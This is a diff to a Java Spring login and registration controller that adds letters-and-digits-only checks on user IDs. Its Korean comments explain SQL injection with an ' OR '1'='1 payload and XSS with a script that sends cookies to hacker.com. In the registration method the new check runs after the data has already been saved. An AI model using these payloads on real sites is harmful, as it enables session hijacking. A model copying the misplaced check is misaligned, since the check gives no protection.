@@ -31,6 +31,11 @@ public class ControllerLogin {
                                @RequestParam(name="pwd", defaultValue = "") String pwd,
                                @RequestParam(name="userType", defaultValue = "") String userType,
                                Model d, HttpSession session) {
+        // 아이디는 영문과 숫자만 허용하는 정규식
+        if(!id.matches("^[a-zA-Z0-9]*$")){
+            d.addAttribute("msg","아이디는 영문과 숫자만 입력 가능합니다.");
+            return "z01_Project/Minsu_page/login";
+        }
         // .isEmpty()는 문자열의 길이가 0인지 확인 -> ""(빈 문자열)인지 확인
         // 내부적으로는 str.length() == 0 와 동일!
         if (id == null || id.trim().isEmpty() || pwd == null || pwd.trim().isEmpty()) {
@@ -39,6 +44,9 @@ public class ControllerLogin {
             d.addAttribute("msg","아이디와 비밀번호를 모두 입력해주세요!");
             return "z01_Project/Minsu_page/login";
         }
+
+
+
         // 서비스단에서 비밀번호 대조 후 그 값을 컨트롤 단으로 다시 불러서 확인!
         // matches()의 결과값 SUCCESS/WRONG_PWD를 여기서 받음
         String result = service.logincheck(userType, id, pwd);
@@ -120,6 +128,35 @@ public class ControllerLogin {
 
         // 1. 서비스 호출
         String result = service.registerProc(register);
+
+        // 형식 검증하기 - DB에 가기 전에 입구에서 차단!
+        // 영문과 숫자만 허용 (XSS 및 Injection 공격 방지)
+        if(register.getId() != null && !register.getId().matches("^[a-zA-Z0-9]*$")) {
+            d.addFlashAttribute("msg", "아이디는 영문과 숫자만 사용할 수 있습니다.");
+            return "redirect:/registerPage";
+        }
+    /*
+    SQL 인젝션
+    DB를 속여서 내 마음대로 조작하는 공격
+    원리: 사용자가 입력하는 창(ID/PWD 등)에 SQL 구문을 교묘하게 섞어 넣어 서버가 엉뚱한 SQ을 실행시킴
+    아이디 칸에 ' OR '1'='1 을 넣으면 1=1은 항상 참으로 모든 사용자 정보를 조회 및 관리자 권한으로 로그인 성공..!
+    
+    SQL 인젝션을 하기 위해서는 ', -, ;, = 같은 특수문자가 필수
+
+
+    XXS(Cross-Site Scripting)
+    게시판 및 입력창에 악성 스크립트를 심어 다른 사용자의 브라우저에서 실행되게 하는 공격
+    원리: 공격자가 게시글/아이디 등에 <script> 태그를 삽입 -> 데이터가 DB에 저장되었다가 다른 사용자가 그 페이지를 열 때 브라우저가
+    스크립트를 실행
+
+    예시: 게시글 제목: <script>document.location='http://hacker.com/steal?cookie=' + document.cookie;</script>
+    결과: 글을 선택한 일반 사용자의 세션 쿠키(로그인 증표)가 해커의 서버로 전송 -> 이 쿠키를 활용해 사용자인척 로그인 가능
+    (세션 하이재킹)
+       
+    XXS를 하려면 <,>,/ 같은 스크립트용 특수문자가 필수 
+
+    */
+
     /*
     기존 if문 여러번을 사용하면 DB에 조회, 저장하는 2번의 통신을 하지만
     tyy-catch를 사용하면 일단 DB 저장 후 오류가 나면 그 때 처리하는 방법!!
